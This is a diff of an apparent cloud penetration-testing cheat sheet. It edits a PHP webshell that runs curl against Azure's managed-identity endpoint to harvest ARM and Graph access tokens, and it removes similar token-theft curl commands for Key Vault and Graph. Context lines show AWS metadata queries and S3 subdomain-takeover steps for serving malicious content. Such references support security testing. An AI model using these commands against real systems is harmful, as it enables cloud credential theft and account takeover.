@@ -144,8 +144,8 @@ curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-toke
 - Get access token from managed identity using another webshell.
 ```
 <?php
- system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
- system('curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+  system ('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+  system ('curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
 ?>
 ```
 
@@ -170,19 +170,7 @@ Get-AzResource
 - The way expression is evaluated means that, most probably, either PHP or Python is used for the web app. We may need to run some trial and error methods to find out the exact language and template framework. 
 - Use ```{{config.items()}}``` and see if it works.
 - Check if a managed identity is assigned (Check for the env variables IDENTITY_HEADER and IDENTITY_ENDPOINT)
-- If code execution is possible execute the following to get a ARM access token for the managed identity:
-```
-curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-```
-- Request keyvault Access token
-```
-curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-```
-- Request AADGraph token
-```
-curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-```
+- If code execution is possible execute the following to get access tokens
 
 ### OS Command injection
 - In case of OS command injection, it is possible to run arbitrary operating  system commands on the server where requests are processed. 
@@ -464,4 +452,3 @@ sudo aws s3 sync s3://<BUCKET> s3-files-dir --profile <PROFILE>
 1. When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error
 2. Go create the S3 bucket with the same name and region
 3. 3. Load malicious content to the new S3 bucket that will be executed when visitors hit the site
-
